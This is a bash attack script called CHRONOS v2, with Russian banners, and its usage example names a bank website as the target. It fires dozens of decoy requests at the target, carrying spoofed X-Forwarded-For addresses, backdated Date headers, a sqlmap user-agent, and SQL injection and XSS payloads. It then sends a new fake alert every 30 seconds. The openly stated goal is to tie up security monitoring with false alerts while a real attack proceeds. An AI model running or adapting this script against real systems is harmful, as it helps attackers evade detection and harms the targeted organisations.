#!/bin/bash
TARGET=$1
[ -z "$TARGET" ] && echo "Usage: $0 https://bank.com [duration_sec]" && exit 1
DURATION=${2:-300}
DOMAIN=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
CHRONOS_DIR="$HOME/.shadow_chronos_v2/$DOMAIN"
mkdir -p "$CHRONOS_DIR"

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║   ⏳ CHRONOS v2 — Временная петля для защиты              ║"
echo "║   Защита застряла в прошлом. Мы атакуем в настоящем.       ║"
echo "╚══════════════════════════════════════════════════════════════╝"

END_TIME=$(($(date +%s) + DURATION))

echo "[CHRONOS] ⏳ Создаю временную петлю на ${DURATION}с..."

# Создаём ложную атаку в прошлом которая зацикливает внимание защиты
echo "[CHRONOS] 🔄 Фаза 1: Ложная атака в прошлом..."
for i in $(seq 1 30); do
    # Запрос с датой из прошлого
    PAST_DATE=$(date -d "-$((RANDOM % 30 + 1)) days -$((RANDOM % 24)) hours" +"%a, %d %b %Y %H:%M:%S GMT" 2>/dev/null || date +"%a, %d %b %Y %H:%M:%S GMT")
    ATTACK_IP="10.$((RANDOM % 255)).$((RANDOM % 255)).$((RANDOM % 255))"

    curl -sk --max-time 2 \
        -H "Date: $PAST_DATE" \
        -H "X-Forwarded-For: $ATTACK_IP" \
        -H "User-Agent: sqlmap/1.0 (https://sqlmap.org)" \
        -H "X-Attack-Type: SQL Injection" \
        -H "X-Threat-Level: CRITICAL" \
        "$TARGET?id=' OR '1'='1&attack=retroactive_$i" \
        -o /dev/null 2>/dev/null &

    # Ложный XSS из прошлого
    curl -sk --max-time 2 \
        -H "Date: $(date -d "-$((RANDOM % 15 + 1)) days -$((RANDOM % 12)) hours" +"%a, %d %b %Y %H:%M:%S GMT" 2>/dev/null || date +"%a, %d %b %Y %H:%M:%S GMT")" \
        -H "X-Forwarded-For: 192.168.$((RANDOM % 255)).$((RANDOM % 255))" \
        -H "User-Agent: <script>alert('XSS')</script>" \
        "$TARGET?q=<script>alert(1)</script>&retro=$i" \
        -o /dev/null 2>/dev/null &
done
wait
echo "  ✅ 60 ложных атак в прошлом создано"

# Зацикливаем защиту на анализе прошлого
echo "[CHRONOS] 🔄 Фаза 2: Зацикливание защиты..."
while [ $(date +%s) -lt $END_TIME ]; do
    # Каждые 30 секунд — новый ложный алерт из прошлого
    PAST=$(date -d "-$((RANDOM % 60)) minutes" +"%a, %d %b %Y %H:%M:%S GMT" 2>/dev/null || date +"%a, %d %b %Y %H:%M:%S GMT")
    curl -sk --max-time 2 \
        -H "Date: $PAST" \
        -H "X-Threat: CRITICAL" \
        -H "X-Attack-Source: internal" \
        "$TARGET?cyclic_attack=$RANDOM" \
        -o /dev/null 2>/dev/null &
    sleep 30
done
wait

echo ""
echo "[CHRONOS] ⏳ Временная петля создана"
echo "[CHRONOS] ⏳ Защита анализирует ПРОШЛОЕ"
echo "[CHRONOS] ⏳ Мы атакуем в НАСТОЯЩЕМ"
echo "[CHRONOS] 📁 $CHRONOS_DIR/"
